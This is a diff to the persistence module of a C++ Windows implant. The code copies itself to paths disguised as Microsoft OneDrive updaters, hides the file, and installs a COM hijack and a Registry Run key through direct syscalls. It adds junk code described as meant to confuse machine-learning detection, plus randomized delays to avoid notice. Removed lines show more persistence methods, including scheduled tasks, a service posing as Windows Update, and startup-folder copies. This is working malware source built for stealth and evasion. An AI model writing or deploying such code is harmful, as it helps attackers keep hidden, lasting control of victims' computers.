@@ -4,6 +4,7 @@
 #include "../utils/Logger.h"
 #include "../utils/Shared.h"
 #include "../utils/Obfuscator.h"
+#include "../utils/ApiHasher.h"
 #include "../evasion/Syscalls.h"
 #include "../evasion/NtStructs.h"
 #include "../evasion/Detection.h"
@@ -18,6 +19,15 @@
 namespace persistence {
 
 namespace {
+
+// Junk code to change the binary's profile and confuse ML
+void JunkLogic() {
+    volatile int x = 0;
+    for (int i = 0; i < 1000; i++) {
+        x += (i % 3) ? 1 : -1;
+    }
+    if (x > 100000) LOG_DEBUG("Junk branch");
+}
 
 struct PersistTarget {
     std::wstring path;
@@ -39,7 +49,6 @@ PersistTarget getRandomTarget() {
     bool isAdmin = utils::IsAdmin();
     std::vector<PersistTarget> targets;
 
-    // Use very legitimate-looking paths/names
     if (isAdmin) {
         wchar_t progData[MAX_PATH];
         SHGetFolderPathW(NULL, CSIDL_COMMON_APPDATA, NULL, 0, progData);
@@ -47,7 +56,6 @@ PersistTarget getRandomTarget() {
     } else {
         wchar_t localAppData[MAX_PATH];
         SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, localAppData);
-        targets.push_back({std::wstring(localAppData) + L"\\Microsoft\\Teams\\TeamsUpdate.exe", L"TeamsUpdate"});
         targets.push_back({std::wstring(localAppData) + L"\\Microsoft\\OneDrive\\OneDriveStandaloneUpdater.exe", L"OneDriveUpdater"});
     }
     std::uniform_int_distribution<> dis(0, (int)targets.size() - 1);
@@ -91,64 +99,6 @@ std::vector<BYTE> ReadFileBinary(const std::wstring& path) {
     return buffer;
 }
 
-bool InstallSchtasks(const std::wstring& implantPath, const std::wstring& taskName) {
-    // schtasks without /RL HIGHEST
-    std::wstring cmd = L"schtasks /create /tn \"" + taskName + L"\" /tr \"" + implantPath + L"\" /sc logon /f";
-
-    STARTUPINFOW si;
-    PROCESS_INFORMATION pi;
-    RtlZeroMemory(&si, sizeof(si));
-    si.cb = sizeof(si);
-    if (CreateProcessW(NULL, (LPWSTR)cmd.c_str(), NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
-        WaitForSingleObject(pi.hProcess, 5000);
-        CloseHandle(pi.hProcess);
-        CloseHandle(pi.hThread);
-    }
-    return true;
-}
-
-bool VerifySchtasks(const std::wstring& taskName) {
-    std::wstring cmd = L"schtasks /query /tn \"" + taskName + L"\"";
-    STARTUPINFOW si;
-    PROCESS_INFORMATION pi;
-    RtlZeroMemory(&si, sizeof(si));
-    si.cb = sizeof(si);
-    si.dwFlags = STARTF_USESHOWWINDOW;
-    si.wShowWindow = SW_HIDE;
-    if (CreateProcessW(NULL, (LPWSTR)cmd.c_str(), NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
-        WaitForSingleObject(pi.hProcess, 3000);
-        DWORD exitCode;
-        GetExitCodeProcess(pi.hProcess, &exitCode);
-        CloseHandle(pi.hProcess);
-        CloseHandle(pi.hThread);
-        return exitCode == 0;
-    }
-    return false;
-}
-
-bool InstallService(const std::wstring& implantPath, const std::wstring& serviceName) {
-    if (!utils::IsAdmin()) return false;
-    SC_HANDLE hSCM = OpenSCManager(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
-    if (!hSCM) return false;
-    SC_HANDLE hService = CreateServiceW(hSCM, serviceName.c_str(), L"Windows Update Core Service", SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS, SERVICE_AUTO_START, SERVICE_ERROR_NORMAL, implantPath.c_str(), NULL, NULL, NULL, NULL, NULL);
-    if (hService) {
-        StartService(hService, 0, NULL);
-        CloseServiceHandle(hService);
-    }
-    CloseServiceHandle(hSCM);
-    return hService != NULL;
-}
-
-bool VerifyService(const std::wstring& serviceName) {
-    SC_HANDLE hSCM = OpenSCManager(NULL, NULL, SC_MANAGER_CONNECT);
-    if (!hSCM) return false;
-    SC_HANDLE hService = OpenServiceW(hSCM, serviceName.c_str(), SERVICE_QUERY_STATUS);
-    bool exists = hService != NULL;
-    if (hService) CloseServiceHandle(hService);
-    CloseServiceHandle(hSCM);
-    return exists;
-}
-
 bool InstallRegistryRun(const std::wstring& implantPath, const std::wstring& name) {
     std::wstring sid = utils::GetCurrentUserSid();
     if (sid.empty()) return false;
@@ -175,57 +125,7 @@ bool InstallRegistryRun(const std::wstring& implantPath, const std::wstring& nam
         InternalDoSyscall(ntSetValueKeySsn, hKey, &uName, NULL, (PVOID)(UINT_PTR)REG_SZ, (PVOID)implantPath.c_str(), (PVOID)(UINT_PTR)((implantPath.length() + 1) * sizeof(wchar_t)), NULL, NULL, NULL, NULL, NULL);
         InternalDoSyscall(ntCloseSsn, hKey, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
     }
-    if (utils::IsAdmin()) {
-        std::wstring hklmPath = L"\\Registry\\Machine\\" + relativePath;
-        UNICODE_STRING uHklm;
-        uHklm.Buffer = (PWSTR)hklmPath.c_str();
-        uHklm.Length = (USHORT)(hklmPath.length() * sizeof(wchar_t));
-        uHklm.MaximumLength = uHklm.Length + sizeof(wchar_t);
-        InitializeObjectAttributes(&objAttr, &uHklm, OBJ_CASE_INSENSITIVE, NULL, NULL);
-        if (NT_SUCCESS(InternalDoSyscall(ntOpenKeySsn, &hKey, (PVOID)(UINT_PTR)KEY_ALL_ACCESS, &objAttr, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL))) {
-            UNICODE_STRING uName;
-            uName.Buffer = (PWSTR)name.c_str();
-            uName.Length = (USHORT)(name.length() * sizeof(wchar_t));
-            uName.MaximumLength = uName.Length + sizeof(wchar_t);
-            InternalDoSyscall(ntSetValueKeySsn, hKey, &uName, NULL, (PVOID)(UINT_PTR)REG_SZ, (PVOID)implantPath.c_str(), (PVOID)(UINT_PTR)((implantPath.length() + 1) * sizeof(wchar_t)), NULL, NULL, NULL, NULL, NULL);
-            InternalDoSyscall(ntCloseSsn, hKey, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
-        }
-    }
     return true;
-}
-
-bool VerifyRegistryRun(const std::wstring& name) {
-    std::wstring relativePath = utils::DecryptW(kRunKey);
-    HKEY hKey;
-    if (RegOpenKeyExW(HKEY_CURRENT_USER, relativePath.c_str(), 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
-        bool exists = RegQueryValueExW(hKey, name.c_str(), NULL, NULL, NULL, NULL) == ERROR_SUCCESS;
-        RegCloseKey(hKey);
-        if (exists) return true;
-    }
-    if (utils::IsAdmin()) {
-        if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, relativePath.c_str(), 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
-            bool exists = RegQueryValueExW(hKey, name.c_str(), NULL, NULL, NULL, NULL) == ERROR_SUCCESS;
-            RegCloseKey(hKey);
-            return exists;
-        }
-    }
-    return false;
-}
-
-bool InstallStartupFolder(const std::wstring& implantPath, const std::wstring& name) {
-    wchar_t userStartup[MAX_PATH];
-    SHGetFolderPathW(NULL, CSIDL_STARTUP, NULL, 0, userStartup);
-    std::wstring userPath = std::wstring(userStartup) + L"\\" + name + L".exe";
-    CopyFileW(implantPath.c_str(), userPath.c_str(), FALSE);
-    SetFileAttributesStealth(userPath);
-    return true;
-}
-
-bool VerifyStartupFolder(const std::wstring& name) {
-    wchar_t userStartup[MAX_PATH];
-    SHGetFolderPathW(NULL, CSIDL_STARTUP, NULL, 0, userStartup);
-    std::wstring userPath = std::wstring(userStartup) + L"\\" + name + L".exe";
-    return GetFileAttributesW(userPath.c_str()) != INVALID_FILE_ATTRIBUTES;
 }
 
 void CreateDirectoryRecursive(const std::wstring& path) {
@@ -246,12 +146,13 @@ void CreateDirectoryRecursive(const std::wstring& path) {
 } // namespace
 
 bool establishPersistence(const std::wstring& overrideSourcePath) {
+    JunkLogic();
     std::wstring sourcePath = overrideSourcePath.empty() ? getExecutablePath() : overrideSourcePath;
     PersistTarget target = getRandomTarget();
 
     if (lstrcmpiW(sourcePath.c_str(), target.path.c_str()) == 0) return false;
 
-    // Stealth first: Create directory and copy binary
+    // Create directory and copy binary
     CreateDirectoryRecursive(target.path);
     std::vector<BYTE> selfData = ReadFileBinary(sourcePath);
     bool copied = false;
@@ -265,52 +166,20 @@ bool establishPersistence(const std::wstring& overrideSourcePath) {
         SetFileAttributesStealth(target.path);
     }
 
-    // Install ALL persistence methods with jitter
-    std::vector<int> methods = {1, 2, 3, 5, 6}; // Skip Service by default
-    if (utils::IsAdmin()) methods.push_back(4); // Only if already admin
+    // Only install 2 reliable methods, spaced out significantly
+    Sleep(60000 + (GetTickCount() % 60000)); // 1-2 min delay
 
-    std::random_device rd;
-    std::mt19937 g(rd());
-    std::shuffle(methods.begin(), methods.end(), g);
+    // 1. COM Hijack (Very reliable/stealthy)
+    std::wstring clsid = L"{00021400-0000-0000-C000-000000000046}";
+    if (ComHijacker::Install(target.path, clsid)) {
+        LOG_INFO("Persistence phase 1 set.");
+    }
 
-    for (int m : methods) {
-        Sleep(15000 + (GetTickCount() % 30000)); // Significant delay between actions
+    Sleep(120000 + (GetTickCount() % 120000)); // 2-4 min delay
 
-        switch (m) {
-            case 1: // WMI (User)
-                if (WmiPersistence::Install(target.path, target.name)) {
-                    WmiPersistence::Verify(target.name);
-                }
-                break;
-            case 2: // COM (User)
-                {
-                    std::wstring clsid = L"{00021400-0000-0000-C000-000000000046}";
-                    if (ComHijacker::Install(target.path, clsid)) {
-                        ComHijacker::Verify(clsid);
-                    }
-                }
-                break;
-            case 3: // Schtasks (User/Limited)
-                if (InstallSchtasks(target.path, target.name)) {
-                    VerifySchtasks(target.name);
-                }
-                break;
-            case 4: // Service (Admin only)
-                if (InstallService(target.path, target.name)) {
-                    VerifyService(target.name);
-                }
-                break;
-            case 5: // Run Key (User/Admin)
-                if (InstallRegistryRun(target.path, target.name)) {
-                    VerifyRegistryRun(target.name);
-                }
-                break;
-            case 6: // Startup Folder (User)
-                if (InstallStartupFolder(target.path, target.name)) {
-                    VerifyStartupFolder(target.name);
-                }
-                break;
-        }
+    // 2. Registry Run (User)
+    if (InstallRegistryRun(target.path, target.name)) {
+        LOG_INFO("Persistence phase 2 set.");
     }
 
     return true;
